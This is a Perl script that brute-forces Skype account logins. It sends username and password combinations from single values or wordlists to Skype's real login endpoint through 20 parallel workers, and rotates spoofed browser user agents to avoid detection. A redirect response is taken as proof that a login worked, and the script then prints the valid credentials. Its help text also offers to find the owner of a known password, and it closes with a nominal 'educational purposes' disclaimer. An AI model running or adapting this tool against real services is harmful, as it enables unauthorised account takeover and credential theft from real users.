#!/usr/bin/perl -w
# There is only one module needed for this script to work
# Parallel::ForkManager
# All other modules are included in perl by default
# You can get the neccessary module here:
# http://search.cpan.org/CPAN/authors/id/D/DL/DLUX/Parallel-ForkManager-0.7.5.tar.gz
use LWP::UserAgent;
use Getopt::Std;
use Parallel::ForkManager;

my %option;
my $forkManager = Parallel::ForkManager->new(20);
getopts('u:p:h',\%option);

if(!$option{'u'} && !$option{'p'})
{
    if($option{'h'}) 
  {
      &helper;
  }
    else 
  {
      &usage;
  }
}
my $login     = $option{'u'};
my $password  = $option{'p'};

our @agents =  (
"Mozilla/5.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
"Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows XP)",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows XP)",
"Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)",
"Mozilla/5.0 (Windows; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)",
"Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; InfoPath.1)",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.9) Gecko/20061206 Firefox/1.5.0.9",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060319 Firefox/2.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1) Gecko/20061003 Firefox/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE; rv:1.8.1) Gecko/20061010 Firefox/2.0",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8b2) Gecko/20050702",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8) Gecko/20060321 Firefox/2.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b) Gecko/20050217",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.8.1) Gecko/20061010 Firefox/2.0",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711",
"Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9a1) Gecko/20060127 Firefox/1.6a1",
"Mozilla/5.0 (Windows; U; Windows NT 5.0;; rv:1.8.0.7) Gecko/20060917 Firefox/1.9.0.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/124 (KHTML, like Gecko) Safari/125.1",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/418.8 (KHTML, like Gecko) Safari/419.3",
"Opera/9.02  (Windows NT 5.0; U; en)",
"Opera/9.10  (Windows NT 5.1; U; en)",
"Opera/9.10  (Windows NT 6.0; U; en)",
"Opera/9.02  (Windows NT 5.2; U; en)",
              );

sub attack
{
	my($suser,$spass) = @_;
  my $agent   = $agents[rand(scalar(@agents))];
	my $host    = 'https://secure.skype.com/store/member/dologin.html';
		 $browser = LWP::UserAgent->new();
		 $browser->agent($agent);
	my $req = HTTP::Request->new(POST => $host);
		 $req->content_type("application/x-www-form-urlencoded");
		 $req->content(qq[login=Sign+me+in&username=$suser&password=$spass]);
	my $res = $browser->request($req);
	if($res->is_success)
  {	 }
   else
   {
			if($res->status_line=~m/302 Moved/gi)
      {
	    	  die "[+] USERNAME \t[$suser ] \tPASSWORD \t[$spass]\t[ OK ]\n";
			}
      else
      {
          print $res->status_line."\n";
       }
   }
}
if($login=~m/^[^a-z]/g)
{
   open (USER, "<", $login) or &err($login);
   @users = <USER>;  close(USER);
}
if($password=~m/^[^a-z]/g)
{
   open (PASS, "<", $password) or &err($password);
   @pass = <PASS>;    close(PASS);
}
if(defined @users)
{
foreach $user (@users)
{
    $user =~ s/\x0a//g;
    chomp($user);
    if(defined @pass)
    {
        foreach $pass (@pass)
        {
            $forkManager->start and next;
              $pass =~ s/\x0a//g;
              chomp($pass);
              &attack($user,$pass);
              printf("[-] USERNAME %-15s \tPASSWORD %12s %8s\n","[$user]","[$pass]","[ FAIL ]");
            $forkManager->finish;
            sleep 5;
          }
    }
    else
    {
        &attack($user,$password);
        printf("[-] USERNAME %15s \t\tPASSWORD %12s %8s\n","[$user]","[$password]","[ FAIL ]");
    }
  }
}
elsif(defined @pass)
{
    foreach $pass (@pass)
    {
        $forkManager->start and next;
        $pass=~s/\x0a//g;
        printf("[-] USERNAME %15s \t\tPASSWORD %12s %8s\n","[$login]","[$pass]","[ FAIL ]");
        &attack($login,$pass);
        $forkManager->finish;
        sleep 5;
    }
}
else
{
    &attack($login,$password);
    printf("[-] USERNAME %15s \t\tPASSWORD %12s %8s\n","[$user]","[$password]","[ FAIL ]");
 }
sub usage { die "Usage: $0 -u <username> -p <password>\nYou can also specify -h for help.\n"; }
sub err   { die "Error: cannot open file $! $_[0]\n"; }
sub helper
{
  print "+-------------------------------------------------------------------------------+   \n";
  print "|                      __  __ __  _  _ ____ () __    ___                        |   \n";
  print '|                      \ \/ /   \| \/ (___ |  |   \/    \                       |',"\n";
  print "|                       >  < (_) |  < / (| |  | |) | ()  |                      |   \n";
  print '|                      /_/\_\___/|_/\_\___/|__|___/\____/                       |',"\n";
  print "|  This script tries to brute skype accounts using specified single or multiple |   \n";
  print "| usernames. To specify list of users you should write usernames in a separate  |   \n";
  print "| file (each username on a new line) and specify the path to this script. Also  |   \n";
  print "| you may use passwords list or single password. The use of single password is  |   \n";
  print "| to try to find appropriate user of a specific password. For example, you may  |   \n";
  print "| have a password that is for some user and do not actually know his/her real   |   \n";
  print "| skype-name. For this purpose you would pass to this script a single           |   \n";
  print "| password and try to find the appropriate owner.                               |   \n";
  print "+-------------------------------------------------------------------------------+   \n";
  print "Script options:                                                                     \n";
  print "\t-u\tUsed to specify single or multiple (from filles) username(s)                  \n";
  print "\t-p\tUsed for a single or a list (from file) of password(s)                        \n";
  print "\t-h\tPrints this help message.                                                     \n";
  print "This script is only for educational purposes, and only for testing own passwords    \n";
  print "against brute forcing mechanisms. Any use of this script against someone else is    \n";
  print "strictly prohibited. The author is not responsible for using this script in such    \n";
  print "a way!                                                                              \n";
  exit (0);
}
$forkManager->wait_all_children;